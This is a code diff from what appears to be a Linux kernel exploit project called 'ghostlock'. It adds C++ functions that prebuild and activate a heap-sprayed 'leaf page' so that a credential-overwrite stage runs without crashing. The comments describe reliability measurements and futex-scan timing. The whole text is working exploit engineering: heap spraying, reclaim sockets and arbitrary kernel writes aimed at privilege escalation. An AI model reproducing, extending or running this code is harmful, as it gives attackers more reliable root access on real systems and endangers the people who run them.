@@ -887,4 +887,58 @@ namespace ghostlock::support {
         }
         return 0;
     }
+
+    Status prepare_prebuilt_leaf_page(const uintptr_t target) {
+        /* Spray the W3-0 leaf-direction page in the W2-safe window and park it
+     * in the prebuilt slot. Measurement on marble (rounds-sprayprobe, 20
+     * cold-boot rounds) puts every PREP-DEATH inside the FIRST KernelSnitch
+     * futex scan after W2's credential write fired (7/7), while the same scan
+     * ran 18/18 times before W2 without wedging -- so the fix moves that one
+     * dangerous spray into the safe window and lets W3-0 activate a finished
+     * page with zero futex traffic. The page keeps its reclaim socket pair in
+     * prebuilt, so nothing here touches current's retired-page hold. */
+        memory::HeapContext &heap = session::g_exploit_session.heap;
+        if (heap.prebuilt.has_reclaim()) {
+            /* A stale prebuilt page targets the previous round's child; its
+         * words are wrong for this one. */
+            heap.prebuilt.destroy();
+        }
+        const memory::WriteRequest request = memory::WriteRequest::make(
+            target, memory::WriteMode::Zero, 1);
+        const uintptr_t base = prepare_good_kernel_page(request);
+        if (!base) {
+            return false;
+        }
+        if (!stash_prebuilt_page()) {
+            pr_warning("prebuilt stash failed; W3-0 falls back to its own spray\n");
+            return false;
+        }
+        pr_info("W3-0 page prebuilt ok base=0x%016zx\n", base);
+        return true;
+    }
+
+    Status consume_prebuilt_leaf_page(const memory::WriteRequest &request) {
+        /* W3-0's fast path: retire the fired W2 page into the hold, put the
+     * prebuilt page in its place, and let attack_write's route run against a
+     * page that never needed the dangerous post-W2 spray. Returns false when
+     * the request does not match the stashed leaf page; the caller then sprays
+     * one the regular way. The stash is consumed either way: after park the
+     * moved-in page must not be double-stashed. */
+        memory::HeapContext &heap = session::g_exploit_session.heap;
+        if (!heap.prebuilt.has_reclaim()) {
+            return false;
+        }
+        if (request.mode != memory::WriteMode::Zero || request.preserve_child) {
+            return false;
+        }
+        if (request.target != heap.prebuilt.fake_parent + 8) {
+            return false;
+        }
+        park_reclaim_page();
+        if (!activate_prebuilt_page()) {
+            pr_warning("prebuilt activation failed; spraying a page instead\n");
+            return false;
+        }
+        return true;
+    }
 } // namespace ghostlock::support
